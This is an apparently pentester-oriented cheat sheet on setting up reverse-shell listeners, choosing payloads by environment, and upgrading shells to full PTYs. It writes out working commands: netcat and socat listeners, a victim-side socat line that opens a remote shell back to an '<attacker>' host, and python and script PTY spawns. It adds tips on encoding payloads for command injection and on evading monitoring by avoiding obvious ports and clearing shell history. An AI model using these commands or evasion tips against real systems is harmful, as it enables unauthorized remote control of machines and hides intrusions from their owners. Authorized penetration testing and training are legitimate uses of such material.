# RevShells Listeners & PTY Upgrades

## Listener First Rule

Never launch payload before listener readiness.

```bash
# netcat (traditional)
nc -lvnp 4444

# ncat (preferred on many systems)
ncat -lvnp 4444

# rlwrap for better UX
rlwrap -cAr nc -lvnp 4444
```

## Payload Selection Matrix

| Environment | Preferred payload |
|---|---|
| Linux with bash + /dev/tcp | Bash TCP one-liner |
| Python present, shell restricted | Python reverse shell |
| Windows host | PowerShell payload |
| Busybox/minimal | nc mkfifo / sh fallback |
| TLS-only egress | socat/OpenSSL/TLS-compatible payload |

## PTY Upgrade Patterns (Linux)

### Method 1: Python PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then on attacker terminal:

```bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 cols 180
```

### Method 2: script utility

```bash
script -qc /bin/bash /dev/null
```

### Method 3: socat full tty

```bash
# victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker>:4444

# attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## Encoding Guidance

- URL encoding for RCE through query/form contexts.
- Base64 for quote escaping and brittle command injectors.
- Avoid over-encoding when plain payload already works (less debugging overhead).

## OPSEC Reminders

- Avoid obvious ports (4444/1337) when monitored.
- Remove command artifacts from shell history if engagement rules allow cleanup.
- Prefer short-lived callbacks over persistent noisy loops.

## Source Pointers

- revshells.com project README (features, raw mode, encoding, HoaxShell integration)
- Common PTY methods from practical shell hardening workflows
